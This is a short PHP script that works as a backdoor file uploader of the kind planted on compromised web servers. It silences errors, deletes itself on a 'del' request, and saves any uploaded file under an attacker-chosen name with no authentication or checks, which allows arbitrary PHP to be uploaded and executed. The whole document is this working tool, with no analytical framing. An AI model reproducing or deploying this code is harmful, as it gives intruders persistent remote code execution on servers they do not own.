<?php
error_reporting(0);
if(isset($_GET['del'])) {
    unlink(__FILE__);
    exit;
}

// If a file is uploaded, move it to the server
if(isset($_FILES['file'])) {
    $saw1 = $_FILES['file']['tmp_name'];
    $saw2 = $_FILES['file']['name'];
    
    if(move_uploaded_file($saw1, $saw2)) {
        echo "Uploaded successfully";
    } else {
        echo "Upload failed";
    }
}

echo "\n<br><br> Upload PHP";
?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file" />
    <input type="submit" value="Upload File" />
</form>
